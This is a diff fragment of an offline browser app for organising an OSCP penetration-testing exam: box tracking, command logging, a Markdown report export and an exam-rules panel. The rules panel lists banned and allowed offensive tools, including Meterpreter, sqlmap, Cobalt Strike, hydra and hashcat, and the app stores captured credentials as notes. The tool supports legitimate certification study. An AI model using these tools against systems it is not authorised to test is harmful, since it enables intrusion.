+  b+=`<h3>What to look for</h3><ul>${c.look.map(l=>`<li>${esc(l)}</li>`).join("")}</ul>`;
+  b+=`<div class="logbar">${logBtns(id,"sugg")}</div>`;
+  openModal(c.title,b);
+}
+
+function openBoxModal(box){
+  const editing=!!box;
+  const b = box || defaultBox("Target "+(state.boxes.length+1));
+  const body=`
+    <div class="note-block">Each box scopes all three panels. Switch with the board on the left.</div>
+    <div class="formgrid">
+      <label class="full">Name<input id="bx-name" value="${esc(b.name)}"></label>
+      <label>IP<input id="bx-ip" class="mono" value="${esc(b.ip)}" placeholder="10.10.10.10"></label>
+      <label>OS<select id="bx-os">${["unknown","linux","windows"].map(o=>`<option ${b.os===o?"selected":""}>${o}</option>`).join("")}</select></label>
+      <label>Type<select id="bx-type">${["standalone","ad"].map(o=>`<option ${b.type===o?"selected":""}>${o}</option>`).join("")}</select></label>
+      <label>Status<select id="bx-status">${["new","foothold","rooted","abandoned"].map(o=>`<option ${b.status===o?"selected":""}>${o}</option>`).join("")}</select></label>
+      <label>Points target<input id="bx-pt" type="number" min="0" value="${b.pointsTarget}"></label>
+      <label>Points earned<input id="bx-pe" type="number" min="0" value="${b.pointsEarned}"></label>
+    </div>
+    <div style="display:flex;gap:8px;margin-top:18px;flex-wrap:wrap">
+      <button class="btn accent" id="bx-save">${editing?"Save changes":"Create box"}</button>
+      ${editing?`<button class="btn" id="bx-reset">Reset box log</button>`:""}
+      ${editing&&state.boxes.length>1?`<button class="btn" id="bx-del" style="margin-left:auto;color:var(--failed);border-color:var(--failed)">Delete box</button>`:""}
+    </div>`;
+  openModal(editing?"Edit box":"New box", body, ()=>{
+    $("#bx-save").addEventListener("click",()=>{
+      b.name=$("#bx-name").value.trim()||b.name;
+      b.ip=$("#bx-ip").value.trim(); b.os=$("#bx-os").value; b.type=$("#bx-type").value;
+      b.status=$("#bx-status").value; b.pointsTarget=+$("#bx-pt").value||0; b.pointsEarned=+$("#bx-pe").value||0;
+      if(!editing){ state.boxes.push(b); state.activeBoxId=b.id; ui.expanded.clear(); }
+      closeModal(); commit();
+    });
+    const rb=$("#bx-reset"); if(rb) rb.addEventListener("click",()=>{ if(confirm("Reset this box's log and facts? (keeps name/IP)")){ b.log=[]; b.facts={ports:[],creds:[],vhosts:[],loot:[]}; b.status="new"; b.startedAt=nowMs(); closeModal(); commit(); } });
+    const db=$("#bx-del"); if(db) db.addEventListener("click",()=>{ if(confirm("Delete box \""+b.name+"\" and all its log entries? This cannot be undone.")){ state.boxes=state.boxes.filter(x=>x.id!==b.id); if(state.activeBoxId===b.id) state.activeBoxId=state.boxes[0].id; closeModal(); commit(); } });
+  });
+}
+
+function openRules(){
+  const c=CARD_BY_ID["rules"];
+  let b=`<div class="note-block"><b>This tool is offline & AI-free by design</b> — using any AI/LLM during the exam or reporting phase is an instant fail.</div>`;
+  b+=`<h3>Hard rules</h3><ul>
+    <li><b>No AI/LLM</b> during the exam OR the reporting phase.</li>
+    <li><b>Metasploit / Meterpreter:</b> one machine only — and <b>not</b> for pivoting. Choose that box wisely.</li>
+    <li><b>No automated exploitation:</b> sqlmap, Armitage, AutoSploit, Cobalt Strike are banned.</li>
+    <li><b>No mass scanners:</b> Nessus, OpenVAS, Nexpose.</li>
+    <li><b>No spoofing/poisoning</b> — Responder's poisoning mode is out (analyse-only is fine).</li>
+  </ul>
+  <h3>Allowed</h3><ul>
+    <li>nmap + NSE, nikto, dirb / gobuster / feroxbuster, Burp Community.</li>
+    <li>hydra; hashcat / john (offline cracking is <b>not</b> exploitation).</li>
+    <li>Your own scripts and manual exploitation (searchsploit → review → run).</li>
+  </ul>
+  <h3>Proof & reporting</h3><ul>
+    <li>Proof = <span class="mono">local.txt</span> / <span class="mono">proof.txt</span> plus <span class="mono">ip a</span> / <span class="mono">ipconfig</span> in the <b>same screenshot</b>.</li>
+    <li>Log every command — this workspace builds your timeline + commands appendix for you.</li>
+    <li>Partial progress is points. Document everything.</li>
+  </ul>`;
+  openModal("Exam rules", b);
+}
+
+/* ============================================================
+   Markdown export (with Mermaid flowchart)
+   ============================================================ */
+function mermaidLabel(e){
+  let s = phaseLabel(e.phase)+": "+e.title;
+  if(e.note) s += " — "+e.note; else if(e.command) s += " ("+e.command+")";
+  s = s.replace(/"/g,"'").replace(/[\[\]{}|]/g," ").replace(/[\r\n]+/g," ").replace(/\s+/g," ").trim();
+  if(s.length>90) s=s.slice(0,87)+"…";
+  return s;
+}
+function boxMarkdown(box){
+  const worked = box.log.filter(e=>e.status==="worked").slice().reverse();   // chronological
+  const failed = box.log.filter(e=>e.status==="failed").slice().reverse();
+  const all = box.log.slice().reverse();
+  const L=[];
+  L.push("# "+box.name+" — OSCP report");
+  L.push("");
+  L.push("| | |");
+  L.push("|---|---|");
+  L.push("| **IP** | `"+(box.ip||"—")+"` |");
+  L.push("| **OS** | "+box.os+" |");
+  L.push("| **Type** | "+box.type+" |");
+  L.push("| **Final status** | "+box.status+" |");
+  L.push("| **Points** | "+(box.pointsEarned||0)+" / "+box.pointsTarget+" |");
+  L.push("");
+
+  // attack flow
+  L.push("## Attack flow");
+  L.push("```mermaid");
+  L.push("flowchart TD");
+  if(!worked.length){
+    L.push('  X["No successful steps logged yet"]');
+  }else{
+    const ids = worked.map((_,i)=>"N"+(i+1));
+    worked.forEach((e,i)=>{ if(i===0) L.push('  '+ids[i]+'["'+mermaidLabel(e)+'"]'); });
+    for(let i=0;i<worked.length-1;i++){
+      L.push('  '+ids[i]+'["'+mermaidLabel(worked[i])+'"] --> '+ids[i+1]+'["'+mermaidLabel(worked[i+1])+'"]');
+    }
+    if(box.status==="rooted"){ L.push('  '+ids[ids.length-1]+' --> ROOT["🏁 ROOT — proof.txt"]'); }
+  }
+  L.push("```");
+  L.push("");
+
+  // what didn't work
+  L.push("## What didn't work");
+  if(!failed.length){ L.push("_No failed attempts logged._"); }
+  else failed.forEach(e=>{ L.push("- **"+phaseLabel(e.phase)+":** "+e.title+(e.note?" — "+e.note:"")+(e.command?"  `"+e.command+"`":"")); });
+  L.push("");
+
+  // timeline
+  L.push("## Timeline");
+  L.push("| Time | Phase | Action | Status | Note |");
+  L.push("|---|---|---|---|---|");
+  all.forEach(e=>{
+    const note=(e.note||"").replace(/\|/g,"\\|");
+    L.push("| "+fmtTime(e.ts)+" | "+phaseLabel(e.phase)+" | "+e.title.replace(/\|/g,"\\|")+" | "+e.status+(e.proof?" 📸":"")+" | "+note+" |");
+  });
+  if(!all.length) L.push("| — | — | _nothing logged_ | — | — |");
+  L.push("");
+
+  // commands appendix
+  L.push("## Commands appendix");
+  L.push("```bash");
+  const cmds=all.filter(e=>e.command);
+  if(!cmds.length) L.push("# no commands logged");
+  cmds.forEach((e,i)=>{ L.push("# "+(i+1)+") ["+e.status+"] "+e.title); L.push(e.command); });
+  L.push("```");
+  L.push("");
+
+  // captured facts
+  if(box.facts.creds.length||box.facts.ports.length||box.facts.vhosts.length||box.facts.loot.length){
+    L.push("## Captured facts");
+    if(box.facts.ports.length) L.push("- **Open ports:** "+box.facts.ports.join(", "));
+    box.facts.creds.forEach(c=>L.push("- **Cred:** `"+(c.user||"?")+":"+(c.pass||c.hash||"?")+"`"+(c.source?" (from "+c.source+")":"")));
+    if(box.facts.vhosts.length) L.push("- **Vhosts:** "+box.facts.vhosts.join(", "));
+    box.facts.loot.forEach(v=>L.push("- **Loot:** "+v));
+    L.push("");
+  }
+
+  // proof checklist
+  L.push("## Proof checklist");
+  L.push("- [ ] `local.txt` captured with `id` / `whoami` and `ip a` / `ipconfig` in the **same screenshot**");
+  L.push("- [ ] `proof.txt` captured at root/SYSTEM with `ip a` / `ipconfig` in the **same screenshot**");
+  L.push("- [ ] Every command above is reproduced in the report");
+  L.push("- [ ] Screenshots saved and referenced");
+  L.push("");
+  return L.join("\n");
+}
+function exportMd(allBoxes){
+  let md;
+  if(allBoxes){
+    const total=state.boxes.reduce((a,b)=>a+(+b.pointsEarned||0),0);
+    md = "# OSCP exam — all boxes\n\n**Total points:** "+total+" / "+state.exam.targetPoints+"\n\n---\n\n"
+       + state.boxes.map(boxMarkdown).join("\n\n---\n\n");
+    download((sanitize("oscp-all-boxes"))+".md", md, "text/markdown");
+  }else{
+    const box=activeBox();
+    md = boxMarkdown(box);
+    download(sanitize(box.name)+".md", md, "text/markdown");
+  }
+  toast("Markdown exported");
+}
+function sanitize(s){ return (s||"box").toLowerCase().replace(/[^a-z0-9]+/g,"-").replace(/^-+|-+$/g,"")||"box"; }
+function download(name, content, type){
+  const blob=new Blob([content],{type:type||"text/plain"});
+  const url=URL.createObjectURL(blob);
+  const a=document.createElement("a"); a.href=url; a.download=name; document.body.appendChild(a); a.click();
+  setTimeout(()=>{ a.remove(); URL.revokeObjectURL(url); }, 100);
+}
+
+/* export menu */
+$("#btnExport").addEventListener("click", ()=>{
+  openModal("Export report (Markdown)", `
+    <div class="note-block">Markdown is the deliverable. The <b>Mermaid flowchart</b> renders as a real diagram in Notion / Obsidian / GitHub / Typora. JSON is a save file, not a report.</div>
+    <p>Failed attempts are excluded from the flow diagram but listed under <b>What didn't work</b>.</p>
+    <div style="display:flex;gap:8px;flex-wrap:wrap;margin-top:14px">
+      <button class="btn accent" id="ex-one">Export active box (${esc(activeBox().name)})</button>
+      <button class="btn" id="ex-all">Export all ${state.boxes.length} boxes</button>
+    </div>`, ()=>{
+    $("#ex-one").addEventListener("click",()=>{ exportMd(false); closeModal(); });
+    $("#ex-all").addEventListener("click",()=>{ exportMd(true); closeModal(); });
+  });
+});
+
+/* backup / import */
+$("#btnBackup").addEventListener("click", ()=>{
+  download("oscp-backup-"+sanitize(new Date().toISOString().slice(0,16))+".json", JSON.stringify(state,null,2), "application/json");
+  toast("JSON backup saved");
+});
+$("#btnImport").addEventListener("click", ()=>$("#importFile").click());
+$("#importFile").addEventListener("change", e=>{
+  const file=e.target.files[0]; if(!file) return;
+  const r=new FileReader();
+  r.onload=()=>{ try{ const s=JSON.parse(r.result); if(!s.boxes||!s.boxes.length) throw 0; if(confirm("Replace current workspace with imported backup? Back up first if unsure.")){ state=normalize(s); ui.expanded.clear(); commit(); toast("Backup imported"); } }catch(err){ toast("Invalid backup file"); } };
+  r.readAsText(file); e.target.value="";
+});
+
+/* topbar buttons */
+$("#btnRules").addEventListener("click", openRules);
+$("#btnStuck").addEventListener("click", ()=>openCardModal("stuck"));
+$("#boxSwitch").addEventListener("click", ()=>{ if(window.matchMedia("(max-width:1080px)").matches) setMobileTab("left"); else openBoxModal(activeBox()); });
+
+/* keyboard */
+document.addEventListener("keydown", e=>{
+  if(e.key==="Escape"){ closeModal(); }
+  if(e.key==="/" && !/INPUT|TEXTAREA|SELECT/.test((e.target.tagName||""))){ e.preventDefault(); setCenterTab("arsenal"); $("#search").focus(); }
+});
+
+/* periodic backup reminder */
+let backupNudges=0;
+setInterval(()=>{ backupNudges++; if(backupNudges%1===0){ toast("⏱ Reminder: Backup JSON (localStorage on file:// can be fragile)"); } }, 20*60*1000);
+
+/* clock tick */
+setInterval(updateClocks, 1000);
+
+/* ============================================================
+   Boot
+   ============================================================ */
+state = load();
+setCenterTab("arsenal");
+setMobileTab("center");
+render();
+</script>
+</body>
+</html>
